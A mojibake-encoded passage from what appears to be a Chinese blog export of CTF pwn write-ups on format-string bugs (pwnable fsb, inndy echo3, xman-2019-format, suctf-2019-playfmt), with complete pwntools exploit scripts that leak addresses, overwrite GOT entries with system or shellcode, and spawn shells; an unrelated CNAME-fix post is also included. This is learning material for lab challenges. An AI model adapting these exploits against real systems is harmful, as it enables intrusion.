io.recvuntil('\\n=====================\\n') io.sendline('%10$p') ret_stack_addr = int(io.recv(10),16) - 28 print('leak ret_stack_addr:'+hex(ret_stack_addr)) info('---change the retaddr---') key = int(str(hex(ret_stack_addr))[-2:],16) payload = \"%&#123;&#125;c%6$hhn\".format(key) raw_input('-&gt;') io.sendline(payload) sleep(0.1) io.recv() key2 = 0xa0a0 payload = \"%&#123;&#125;c%10$hn\".format(key2) payload = payload.ljust(0x40) payload += asm(shellcraft.sh()) raw_input('-&gt;') io.sendline(payload) io.recv() sleep(0.1) io.sendline('quit') io.interactive() è®°å¾—å‘å‡ºå»ä¸€æ¬¡payloadï¼Œä¸€å®šéœ€è¦æ¥å—ä¸€æ¬¡ï¼Œå†å»å‘ç¬¬äºŒä¸ªpayloadï¼Œé˜²æ­¢æ²¡æœ‰å®Œæˆä¸€ä¸ªprintfï¼Œå°±è®©ç¨‹åºæ¥å—å‘é€çš„ä¸œè¥¿ï¼Œè¿™æ ·å®¹æ˜“å´©æºƒã€‚ pwnable-fsbarchå’Œä¿æŠ¤Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) å¼€äº†nxäº†ã€‚ idaåˆ†æfor ( k = 0; k &lt;= 3; ++k ) &#123; printf(\"Give me some format strings(%d)\\n\", k + 1); read(0, buf, 0x64u); printf(buf); &#125; puts(\"Wait a sec...\"); sleep(3u); å¯ä»¥çœ‹åˆ°è¿™é‡Œæ§åˆ¶äº†å¯ä»¥åˆ©ç”¨printfå‡½æ•°æ¼æ´çš„æ¬¡æ•°ï¼Œåªå¯ä»¥åˆ©ç”¨4æ¬¡ã€‚ execve(path, &amp;path, 0); ä¸”è¿™ä¸€æ¡å¯ä»¥ç»™ä½ æ‹¿åˆ°shellã€‚ é‚£æ”»å‡»æ€è·¯å°±å¯ä»¥æ˜¯æ”¹æ‰putsï¼Œsleepçš„gotè¡¨ï¼Œåˆ°è¿™ä¸ªæ‹¿å–shellçš„ä½ç½®å°±è¡Œã€‚å› ä¸ºè¿™é‡Œä¸‹é¢å°±è°ƒç”¨ä¸€æ¬¡sleepï¼Œå°±æ”¹å®ƒå¥½äº†ï¼ŒåŸºæœ¬ä¸ä¼šå‡ºé—®é¢˜ã€‚ æ³¨æ„ä¸€ä¸‹è¿™é‡Œçš„æ±‡ç¼–ä»£ç ï¼Œå…¶ä¹Ÿæ˜¯è®©æ ˆçš„espå¤„äºä¸å®šçš„çŠ¶æ€ã€‚ gdbåˆ†ææ­¤æ—¶çš„EBP = 0xffffd228 0000| 0xffffd1e0 --&gt; 0x804a100 (\"AAAA\\n\") 0004| 0xffffd1e4 --&gt; 0x804a100 (\"AAAA\\n\") 0008| 0xffffd1e8 --&gt; 0x64 ('d') 0012| 0xffffd1ec --&gt; 0xf7f5b2a2 (\"__vdso_clock_gettime\") 0016| 0xffffd1f0 --&gt; 0xf7fe1fc9 (&lt;do_lookup_x+9&gt;: add ebx,0x1b037) 0020| 0xffffd1f4 --&gt; 0x0 0024| 0xffffd1f8 --&gt; 0xf7ffdad0 --&gt; 0xf7ffda74 --&gt; 0xf7fd3470 --&gt; 0xf7ffd918 --&gt; 0x0 0028| 0xffffd1fc --&gt; 0xffffd278 --&gt; 0xf7e0b018 --&gt; 0x3eab 0032| 0xffffd200 --&gt; 0xffffd2c0 --&gt; 0x804a024 --&gt; 0xf7ed6290 (&lt;close&gt;: cmp DWORD PTR gs:0xc,0x0) 0036| 0xffffd204 --&gt; 0x8048870 (\"/bin/sh\") 0040| 0xffffd208 --&gt; 0x0 0044| 0xffffd20c --&gt; 0x0 0048| 0xffffd210 --&gt; 0xffffd4a4 --&gt; 0x0 0052| 0xffffd214 --&gt; 0xffffdfce --&gt; 0x656d2f00 ('') 0056| 0xffffd218 --&gt; 0xffffd230 --&gt; 0x0 0060| 0xffffd21c --&gt; 0xffffd234 --&gt; 0x0 0064| 0xffffd220 --&gt; 0x0 0068| 0xffffd224 --&gt; 0x1 0072| 0xffffd228 --&gt; 0xffffd378 --&gt; 0x0 å¯ä»¥çœ‹åˆ°ï¼Œå› ä¸ºè¿™ä¸ªé¢˜æ˜¯main -&gt; fsb ,ç”¨æˆ·ä»£ç åªæœ‰2å±‚å‡½æ•°çš„è°ƒç”¨ï¼Œçœ‹è¿™ä¸ªebp chainçš„æ—¶å€™å°±æœ‰ç‚¹ä¸æ–¹ä¾¿äº†ï¼Œæˆ‘ä»¬æ²¡æœ‰ä¸€ä¸ªå®Œæ•´çš„chainæ¥ä½¿ç”¨ã€‚è¿™ä¸ªæ—¶å€™ï¼Œå°±åªèƒ½æŠŠebp3 çš„å€¼ï¼Œè‡ªå·±å†™ä¸Šå»ï¼Œå†™ä¸Šsleepçš„gotç„¶åå†æ”¹æˆæ‹¿shellçš„åœ°å€å°±è¡Œäº†ã€‚æ•´ä¸ªè¿‡ç¨‹è¿˜æ˜¯éœ€è¦æ³„æ¼ä¸€ä¸‹æ ˆåœ°å€espï¼Œå› ä¸ºå…¶æ ˆæ˜¯å˜åŒ–çš„ã€‚æ³„éœ²ä»¥åï¼Œä¹Ÿè·å–ä¸€ä¸‹ebp2çš„å€¼ï¼Œç„¶åï¼ˆebp2- esp ï¼‰/4 ä¹Ÿå°±ç¡®å®šåˆ°äº†ï¼Œmainçš„ebpå€¼ï¼ˆebp3ï¼‰å¯¹åº”æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»å€¼ã€‚ç„¶åå†æ¬¡åˆ©ç”¨printfå‡½æ•°æ ¹æ®è¿™ä¸ªåç§»æ¥è¿›è¡Œæ”¹å†™sleep gotä¸Šçš„å€¼ã€‚ expfrom pwn import * import time context.log_level = 'debug' context.arch = 'i386' io = process('./fsb') # s = ssh( # host=\"pwnable.kr\", # port=2222, # user=\"fsb\", # password=\"guest\" # ) # io = s.run(\"/home/fsb/fsb\") # io = shell.run(\"/home/fsb/fsb\") sleep_got = 0x0804a008 info('--------leak stack base:-------') io.recvuntil('strings(1)\\n') io.sendline('%14$p') io.recvuntil('0x') stack_base = int(io.recv(8),16) - 80 print(hex(stack_base)) info('--------leak the point to main ebp:-------') io.recvuntil('strings(2)\\n') io.sendline('%18$p') io.recvuntil('0x') point = int(io.recv(8),16) print(hex(point)) info('--------write sleep_got to main_ebp :-------') io.recvuntil('strings(3)\\n') key1 = 0x0804A008 payload = '%' + str(key1) + 'c%18$n' io.sendline(payload) info('--------write tag to sleep_got :-------') tag = 0x869F offset = (point - stack_base) / 4 payload = \"%&#123;&#125;c%'str(offset)'$hn \".format(tag) io.recvuntil('strings(4)\\n') io.sendline(payload) io.interactive() inndy-echo3ä¿æŠ¤å’ŒarchArch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) idaåˆ†æè¿™ä¸€å¤„ä¼šè®©æ ˆçš„æƒ…å†µå˜å¾—æ— æ³•é¢„æµ‹ã€‚ç„¶åè¿›å…¥hardfmtï¼š for ( i = 0; i &lt;= 4; ++i ) &#123; read(0, buff, 0x1000u); printf(buff); &#125; è¿™ä¸€å¤„å­˜åœ¨æ¼æ´ï¼Œä¸”å¾€ä¸‹çœ‹æ„Ÿè§‰æ²¡ä»€ä¹ˆå¥½åˆ©ç”¨çš„ï¼Œæ²¡ä»€ä¹ˆæ¼æ´å‡½æ•°ã€‚é‚£æ”»å‡»æ€è·¯å°±æ˜¯ï¼šæ”¹printfçš„gotè¡¨ï¼Œç„¶ååœ¨ç¬¬5æ¬¡ä¼ è¿‡å»/bin/shå³å¯ã€‚ï¼ˆè¿™ä¸ªé¢˜ç›®æ€è·¯è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œä½†æ˜¯å› ä¸ºè¿™ä¸ªæ¬¡æ•°çš„é™åˆ¶ï¼Œåœ¨å®é™…æ“ä½œè¿‡ç¨‹ä¸­ï¼Œè¦å……åˆ†çš„åˆ©ç”¨æ¯ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚ï¼‰ gdbåˆ†æå› ä¸ºæ ˆæƒ…å†µä¸ä¸€æ ·ï¼Œå¯ä»¥é€‰æ‹©æœ€é€‚åˆæˆ‘ä»¬åˆ©ç”¨æ¼æ´çš„æ ˆç©ºé—´ï¼Œè¿™æ ·åšèµ·æ¥ä¼šç®€å•ä¸€äº›ã€‚ æˆ‘è‡ªå·±é€‰æ‹©åœ¨åç§»åœ¨43çš„æ—¶å€™å¼€å§‹è¿›è¡Œåˆ†æï¼Œæƒ³åŠæ³•æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼š ä»”ç»†çœ‹ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µ ï¼Œç„¶åå†æ¬¡åˆ†æä¸‹æˆ‘ä»¬çš„ç›®æ ‡ ï¼š æ³„æ¼libcåŸºå€ï¼Œè®¡ç®—å‡ºsystemçš„å†…å­˜åœ°å€ã€‚ åœ¨æ ˆä¸Šæ„é€ å‡ºprintfçš„gotåœ°å€å’Œprintfçš„gotåœ°å€+2çš„åœ°å€ï¼ˆ0x0804a014å’Œ0x0804a016ï¼‰ åœ¨æ„é€ çš„gotåœ°å€ä¸Šï¼Œå¼€å§‹å†™systemåœ°å€ ç”±äºè¿™ä¸ªæ¼æ´å¯ä»¥çš„ç”¨çš„æ¬¡æ•°æœ€å¤šæ˜¯4æ¬¡ï¼Œæ‰€ä»¥è¦å°½å¯èƒ½åˆ©ç”¨æ¯ä¸€æ¬¡ã€‚å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¾ˆç®€å•å°±å¯ä»¥æ³„æ¼å‡ºlibcåŸºå€ã€‚ä½†æ˜¯æ¥ä¸‹æ¥æ€ä¹ˆæ„é€ printfçš„gotåœ°å€å’Œprintfçš„gotåœ°å€+2çš„åœ°å€å°±æœ‰ç‚¹éš¾äº†ã€‚ æ­¤æ—¶æ³¨æ„å›¾ä¸Šå‰ä¸¤ä¸ªæ¡†æ¡†ï¼Œå¯ä»¥å‘ç°æŠŠç¬¬äºŒä¸ªæ¡†æ¡†çš„ä¸¤ä¸ªåœ°å€ä¿®æ”¹ä¸º ç¬¬ä¸€ä¸ªæ¡†æ¡†çš„æ ˆæŒ‡é’ˆï¼š gdb-peda$ set *0xffbe5e6c = 0xffbe5d54 gdb-peda$ set *0xffbe5e64 = 0xffbe5d60 è¿™ä¸ªè¿‡ç¨‹åœ¨æ³„æ¼ç›®æ ‡æ ˆåœ°å€ä»¥åï¼Œä¹Ÿæ˜¯å¯ä»¥é€šè¿‡ä¸€æ¬¡printfå‡½æ•°å†™å…¥2æ¬¡åœ°å€ï¼Œå®ç°è¿™ä¸ªæ ˆæƒ…å†µçš„ã€‚ æ¥ç€å°±å¯ä»¥æ„é€ gotåœ°å€ï¼š gdb-peda$ set *0xffbe5d60 = 0x0804a016 gdb-peda$ set *0xffbe5d54 = 0x0804a014 ç„¶åå°±å¯ä»¥å†™systemçš„å†…å­˜åœ°å€ä¸Šgotäº†ï¼š 0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;: sub esp,0xc) è¿™æ ·å†ä¼ è¿‡å»ä¸€ä¸‹/bin/shå³å¯ã€‚ expfrom pwn import * context.log_level = 'debug' context.arch ='i386' import time elf = ELF('./echo3') debug = 1 while True: if debug : io = process('./echo3') libc = elf.libc else: io = remote('node3.buuoj.cn',25057) libc = ELF('./libc-2.23.so.i386') payload = '%43$pA%30$pA%47$p' io.sendline(payload) address = io.recvline().strip() if address[-3:] == '637': if address[7:10] == '637': libc_base = int(address[2:10],16) - 247 - libc.symbols['__libc_start_main'] tag1_stack_point = int(address[13:21],16) - 0x118 tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8 system_addr = libc_base + libc.symbols['system'] print('system_addr -&gt;' + hex(system_addr)) print('tag1_stack_point -&gt;' + hex(tag1_stack_point)) print('tag2_stack_point -&gt;' + hex(tag2_stack_point)) break else : io.close() continue # io = def fmtshort(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result def fmtbyte(prev,val,idx,byte = 1): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hhn\" return result printf_got = 0x0804a014 key1 = int(hex(tag1_stack_point)[-4:],16) key2 = int(hex(tag2_stack_point)[-4:],16) info('--------change the two points to tag_stack_point:-------') # raw_input('-&gt;') prev = 0 payload = \"\" for i in range(1): payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i) prev = (key1 &gt;&gt; i*16) &amp; 0xffff for i in range(1): payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i) prev = (key2 &gt;&gt; i*16) &amp; 0xffff payload = payload + '1111' raw_input('-&gt;') io.sendline(payload) io.recvuntil('1111') info('--------change got_table to printf_got:-------') raw_input('-&gt;') prev = 0 payload = \"\" key3 = 0x14 key4 = 0x16 for i in range(1): payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i) prev = (key3 &gt;&gt; i*8) &amp; 0xff for i in range(1): payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i) prev = (key4 &gt;&gt; i*8) &amp; 0xff payload = payload + '2222' io.sendline(payload) io.recvuntil('2222') info('--------change printf_got to system_addr:-------') raw_input('-&gt;') prev = 0 payload = \"\" key5 = int(hex(system_addr)[-4:],16) key6 = int(hex(system_addr)[2:6],16) print('key5 -&gt; ' + hex(key5)) print('key6 -&gt; ' + hex(key6)) for i in range(1): payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i) prev = (key5 &gt;&gt; i*16) &amp; 0xffff for i in range(1): payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i) prev = (key6 &gt;&gt; i*16) &amp; 0xffff payload = payload + '3333' io.sendline(payload) sleep(1) io.recvuntil('3333') raw_input('&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;') io.sendline('/bin/sh\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00') io.interactive() è¿™ä¸ªexpçš„éš¾ç‚¹åœ¨äºï¼š æ³¨æ„å»å®šä½åˆ°åˆé€‚çš„æ ˆç»“æ„å†å»åˆ©ç”¨ å°½é‡å……åˆ†åˆ©ç”¨æ¯ä¸€æ¬¡çš„printf å•æ¬¡printfå¤šæ¬¡å†™å…¥ æ³¨æ„æ¯æ¬¡ä¼ æ•°æ®è¿‡å»åï¼Œä¸€å®šè¦æ¥æ”¶ä¸€ä¸‹ï¼Œå¹¶ä¸”å†ä¸€æ¬¡çš„æ•°æ®è¯»å…¥è¦é˜²æ­¢bssä¸Šçš„ç¼“å†²åŒºé‡Œé¢å‚æ‚æ•°æ®çš„å½±å“ã€‚ç»“è®ºå’Œæ”¶è· è¿™ä¸ªé¢˜æ•™ä¼šæˆ‘ä¸€å®šè¦çµæ´»ã€å……åˆ†çš„åˆ©ç”¨æ ˆä¸Šçš„æ•°æ®,å•çº¯çš„ebpé“¾åªæ˜¯é€‚åˆç®€å•çš„æƒ…å†µã€‚è¿˜æœ‰å°±æ˜¯é¢å¯¹è¿™ç§ä¼šæœ‰éšæœºæ ˆæƒ…å†µçš„é¢˜ç›®ï¼Œå°½é‡è¦æ³¨æ„æœ¬åœ°å’Œè¿œç¨‹çš„ibcç‰ˆæœ¬ã€æ³¨æ„ç¯å¢ƒ,è¿™äº›ä¸ä¸€æ ·å¯¼è‡´æ ˆçš„æƒ…å†µä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯¼è‡´expä¹Ÿè¦æœ‰ç›¸åº”çš„å˜åŒ–ã€‚ xman-2019-formatä¿æŠ¤å’ŒarchCANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial idaåˆ†æchar *__cdecl sub_80485C4(char *s) &#123; char *v1; // eax char *result; // eax puts(\"...\"); v1 = strtok(s, \"|\"); printf(v1); while ( 1 ) &#123; result = strtok(0, \"|\"); if ( !result ) break; printf(result); &#125; return result; &#125; è¿™é‡Œå› ä¸ºç”¨strtokåšå¤„ç†ï¼Œåªæœ‰ä¸€æ¬¡çš„ä¼ é€æœºä¼šï¼Œpayloadéœ€è¦ç”¨| åˆ†å‰²æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥å®Œæˆæ¯æ¬¡çš„printfçš„æ¼æ´åˆ©ç”¨ï¼Œç¨å¾®éº»çƒ¦äº†ä¸€ä¸‹ã€‚å¹¶ä¸”å­˜åœ¨åé—¨å‡½æ•°ï¼š .text:080485AB push ebp .text:080485AC mov ebp, esp .text:080485AE sub esp, 8 .text:080485B1 ; 3: return system(\"/bin/sh\"); .text:080485B1 sub esp, 0Ch .text:080485B4 push offset command ; \"/bin/sh\" .text:080485B9 call _system .text:080485BE add esp, 10h .text:080485C1 nop .text:080485C2 leave .text:080485C3 retn è¿™ä¸‹å¯ä»¥ç›´æ¥æ”¹ret addresså³å¯ã€‚ gdbåˆ†æå…ˆè§‚å¯Ÿä¸€ä¸‹ebpé“¾æ˜¯å¦å­˜åœ¨ ï¼šæ˜¯å­˜åœ¨çš„ï¼Œç„¶åç›´æ¥åˆ©ç”¨å°±å¥½äº†ã€‚çœ‹ä¸€ä¸‹ï¼Œåœ¨ç¬¬ä¸€æ¬¡æ”¹ebp2é‡Œé¢çš„å€¼ï¼š 0xffffd338 æ—¶ï¼Œå‘ç°ä¸‹é¢çš„ç¬¬äºŒä¸ªåªéœ€è¦æ”¹ä¸€ä¸ªå­—èŠ‚å³å¯ï¼Œç„¶åç›®æ ‡å°±æ˜¯æ”¹æˆè¿™ä¸ªæ ˆåœ°å€äº†ï¼šç„¶åæ¥ç€åˆ©ç”¨æ¼æ´ï¼Œæ”¹ä¸€ä¸‹è¿”å›åœ°å€åˆ°åé—¨å‡½æ•°å³å¯ã€‚ ï¼ˆè¿™ä¸ªé¢˜è‡ªå·±åœ¨åšçš„æ—¶å€™ï¼Œå…ˆæ˜¯è¯•ç€åˆ©ç”¨ç¬¬äºŒä¸ªçš„0xffffd2f8 ï¼Œè¿™ä¸ªé“¾å‘ç°æœ¬åœ°å¯ä»¥æ‰“é€šï¼Œè¿œç¨‹æ˜¯ä¸è¡Œçš„ï¼Œè¿™å°±æ˜¯ç¯å¢ƒå› ç´ äº†ï¼Œè¿œç¨‹ç”±äºlibcç‰ˆæœ¬çš„ä¸åŒï¼Œæ ˆç»“æ„ä¹Ÿæ˜¯ä¸åŒçš„ã€‚æ‰€ä»¥åšé¢˜è¿˜æ˜¯ä¼˜å…ˆï¼Œè€ƒè™‘ebpé“¾ï¼Œç„¶åæ²¡æ³•åˆ©ç”¨äº†ï¼Œåœ¨è€ƒè™‘å……åˆ†åˆ©ç”¨æ ˆæ•°æ®ï¼Œè¿™ä¸ªé€šå¸¸ä¹Ÿæ˜¯å‡ºé¢˜äººç²¾å¿ƒè®¾è®¡çš„æ ˆç»“æ„ï¼Œè®©ä½ æœ‰æ•°æ®å¯ä»¥åˆ©ç”¨ã€‚ï¼‰ expfrom pwn import * context.log_level = 'debug' context.arch = 'i386' system_addr = 0x080485B4 tag1 = 0x4c tag2 = 0x85ab io = process('./xman_2019_format') # io = remote('node3.buuoj.cn',27012) payload = '%&#123;&#125;c%10$hhn|'.format(0x4c) payload += '%&#123;&#125;c%18$hn~'.format(0x85ab) while True: try: io.recvuntil('...\\n...\\n') io.sendline(payload) sleep(0.1) io.recvuntil('~') io.sendline('ls') io.recvline() io.recvline() io.interactive() break except EOFError : io.close() io = process('./xman_2019_format') # io = remote('node3.buuoj.cn',27012) éœ€è¦çˆ†ç ´æ ˆã€‚ suctf-2019-playfmtä¿æŠ¤å’ŒarchArch: i386-32-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) å¼€å¯äº†RELROï¼Œè¿™æ ·å°±æ— æ³•got hijackäº† idaåˆ†æ gdbåˆ†æç¨‹åºå…ˆè¯»å…¥äº†flagæ–‡ä»¶ï¼Œè‡ªå·±å¯ä»¥å†™ä¸€ä¸ªflagæ–‡ä»¶æµ‹è¯•ï¼Œå¹¶ä¸”gdbè·Ÿéšï¼šå…¶ä¼šè¢«è¯»åˆ°å †ä¸Šã€‚ç´§æ¥ç€è·Ÿåˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å¤„ï¼šçœ‹ä¸€ä¸‹è¿™ä¸ªå †åœ°å€æ˜¯å¦è¢«ç¨‹åºæ“ä½œä¿®æ”¹äº†ï¼š gdb-peda$ x/s 0x8050b70 0x8050b70: \"flag&#123;f9255a80-e059-4c12-8788-161bf8c6908b&#125;\" å‘ç°å¹¶æ²¡æœ‰ï¼Œé‚£å°±å¾ˆç®€å•äº†ã€‚æ”»å‡»æ€è·¯å°±æ˜¯ï¼Œåœ¨æ ˆä¸Šæ„é€ å‡ºè¿™ä¸ªå­˜æ”¾flagçš„å †åœ°å€ï¼ˆè®¡ç®—æ–¹å¼å°±æ˜¯åœ¨æ­¤æ—¶çš„æ ˆä¸Šæ‰¾ä¸€ä¸ªåœ°å€æ¥è®¡ç®—åç§»è·å–ï¼‰ã€‚ç¬¬ä¸€æ­¥ï¼šå…ˆä¿®æ”¹ebp2ä¸Šå­˜æ”¾çš„å€¼ï¼Œæ”¹æˆåé¢é‚£ä¸ªæ¡†æ¡†å¯¹åº”çš„æ ˆåœ°å€ï¼Œç„¶ååœ¨åšå¤„ç†ï¼š 0024| 0xffffd318 --&gt; 0xffffd338 --&gt; 0xffffd348 --&gt; 0x8050ba0 --&gt; 0x0 æ­¤æ—¶å†ä¿®æ”¹ebp1ä¸Šçš„å€¼ï¼Œæ”¹æˆåˆšåˆšçš„å †åœ°å€ ï¼š è¿™æ ·expå†™çš„æ—¶å€™ï¼Œæ‰¾å¥½åç§»%sä¸€ä¸‹å°±å‡ºæ¥äº†ã€‚ expfrom pwn import * context.log_level = 'debug' context.arch = 'i386' # io = remote('node3.buuoj.cn',27816) io = process('./1') io.recvuntil('Magic echo Server') io.recvuntil('=====================\\n') io.sendline('%18$p') io.recvuntil('0x') flag = int(io.recv(8),16) print(hex(flag)) key = int((hex(flag))[-4:],16) - 32 -12 -4 print('key'+ hex(key)) # raw_input('-&gt;') io.sendline('%6$p') io.recvuntil('0x') stack_point = int(io.recv(8),16) + 16 tag1 = int((hex(stack_point))[-2:],16) print(hex(tag1)) payload = '%' + str(tag1) + 'c%6$hhn' + '1' raw_input('-&gt;') io.sendline(payload) io.recvuntil('1') payload = '%' + str(key &amp; 0xffff) + 'c%14$hn' + '2' raw_input('-&gt;') io.sendline(payload) io.recvuntil('2') io.sendline('%18$s') io.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"å­¦ä¹ è®°å½•","slug":"å­¦ä¹ è®°å½•","permalink":"http://chumen77.xyz/tags/å­¦ä¹ è®°å½•/"}]},{"title":"ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ","slug":"ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ","date":"2020-03-12T15:17:10.000Z","updated":"2020-03-13T02:48:54.000Z","comments":true,"path":"2020/03/12/ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ/","link":"","permalink":"http://chumen77.xyz/2020/03/12/ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ/","excerpt":"","text":"ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆèƒŒæ™¯è‡ªå·±çš„ä»¥å‰ç”³è¯·è¿‡ä¸€ä¸ªä¸ƒåƒäº‘åšè‡ªå·±çš„å›¾åºŠï¼Œä»Šæ™šå†™åšå®¢å‘ç°ï¼Œè‡ªå·±ä¸Šä¼ ä¸ä¸Šå›¾ç‰‡ï¼Œå¹¶ä¸”ç”¨upicå¯¼å‡ºæ¥çš„é“¾æ¥æ— æ³•æ˜¾ç¤ºå›¾ç‰‡äº†ã€‚æŸ¥äº†å¾ˆä¹…çš„åŸå› ï¼Œå‘ç°æ˜¯ä¸ƒåƒç‰›åŸæ¥ç»™æˆ‘åˆ†é…çš„å…è´¹å¤–é“¾åŸŸåç»™æˆ‘æ–­ç”¨äº†ã€‚å°±æ˜¯è¿™ä¸ªæ²¡äº†ï¼Œè‡ªå·±æ’é”™ï¼Œæ’äº†åŠå¤©æ‰å‘ç°ã€‚æ˜¯åœ¨è¿™é‡Œæ‰¾åˆ°çš„ï¼Œå¥½éšè”½ã€‚ã€‚ã€‚ç„¶åå°±åœ¨æ–‡ä»¶ç®¡ç†é‚£é‡Œå‘ç°ï¼Œç½‘ç«™æç¤ºè¯´å¦‚æœæ— æ³•æ˜¾ç¤ºå›¾ç‰‡ï¼ŒåŠ è½½æ…¢ï¼Œå¯ä»¥åŠ ä¸€ä¸ªåŸŸåã€‚ç„¶åæˆ‘å°±å°è¯•åŠ äº†ä¸€ä¸ªï¼Œç„¶åå°±ä¿®å¤å¥½äº†ã€‚ ä¿®å¤è¿‡ç¨‹ç»‘å®šåˆ›å»ºåŸŸåxxxxä¹Ÿå°±æ˜¯å¡«ä½ çš„åŸŸåï¼Œå‰é¢çš„å¯ä»¥è‡ªå®šä¹‰ã€‚ç‚¹å‡»æ·»åŠ åä¸‹é¢æ€»æ˜¯ä¼šè‡ªåŠ¨åˆå¼¹å‡ºä¸€ä¸ªç©ºç™½çš„æ¡†ï¼Œç‚¹å‡»åé¢çš„åˆ é™¤ï¼Œå¦åˆ™ï¼Œå¾€ä¸‹æ»‘ä½ ä¼šå‘ç°å°±æ˜¯åˆ›å»ºä¸äº†è¿™ä¸ªè®°å½•ã€‚åˆ›å»ºæˆåŠŸåï¼Œä¼šæç¤ºä½ å¤åˆ¶CNAMEï¼Œå¤åˆ¶ä¸€ä¸‹ï¼Œå»å¾€ä½ è‡ªå·±çš„åŸŸåç½‘ç«™ï¼Œæˆ‘ç”¨çš„æ˜¯é˜¿é‡Œäº‘ã€‚ å»è‡ªå·±çš„dnsè§£æå¹³å°ï¿¼è¿™é‡Œçš„ä¸»æœºè®°å½•å¡«å…¥åˆšåˆšä½ è‡ªå®šä¹‰çš„ä¸»æœºå¼€å¤´ï¼Œè®°å½•å€¼å¡«å…¥åˆšåˆšå¤åˆ¶çš„CNAMEï¼Œå°±å¯ä»¥äº†ã€‚ ä¿®æ”¹upicè®¾ç½®å¡«å…¥å³å¯ï¼Œä»¥å‰å†™çš„åšå®¢ï¼Œå›¾ç‰‡çš„é“¾æ¥ä¹Ÿè¦æ”¹ä¸€ä¸‹ï¼Œå°±æ¢å¤åŸæ¥çš„æ ·å­äº†ã€‚","categories":[],"tags":[{"name":"æ‚é¡¹","slug":"æ‚é¡¹","permalink":"http://chumen77.xyz/tags/æ‚é¡¹/"}]},{"title":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰","slug":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰","date":"2020-03-12T13:13:41.000Z","updated":"2020-10-07T01:18:54.688Z","comments":true,"path":"2020/03/12/æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰/","link":"","permalink":"http://chumen77.xyz/2020/03/12/æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰/","excerpt":"","text":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰å‰è¨€è®°å½•ä¸€ä¸‹ï¼Œåœ¨å­¦ä¹ è¿™ä¸ªæ¼æ´æ—¶å€™çš„è‡ªå·±æ„Ÿè§‰çš„ç–‘éš¾ç‚¹ï¼Œå’Œåšé¢˜æ—¶å€™çš„ä¸€ç‚¹å°æŠ€å·§ï¼Œè¿™ä¸€ç¯‡ä¸»è¦æ˜¯è®°å½•ç†è®ºã€‚ æ ¼å¼åŒ–å­—ç¬¦ä¸²åŸºæœ¬æ ¼å¼ï¼š %[parameter][flags][field width][.precision][length]type éœ€è¦é‡ç‚¹å…³æ³¨çš„patternï¼š parameter ï¼šn$ï¼Œè·å–æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„æŒ‡å®šå‚æ•° field width ï¼šè¾“å‡ºçš„æœ€å°å®½åº¦ precision ï¼šè¾“å‡ºçš„æœ€å¤§é•¿åº¦ lengthï¼Œè¾“å‡ºçš„é•¿åº¦ : hhï¼Œ1-byte ï¼› hï¼Œ2-byte ï¼› l, 4-byte ï¼›ll,8-byte ï¼› type :d/iï¼Œæœ‰ç¬¦å·æ•´æ•° uï¼Œæ— ç¬¦å·æ•´æ•° x/Xï¼Œ16 è¿›åˆ¶ unsigned int ã€‚x ä½¿ç”¨å°å†™å­—æ¯ï¼›X ä½¿ç”¨å¤§å†™å­—æ¯. sï¼Œè¾“å‡ºä»¥null 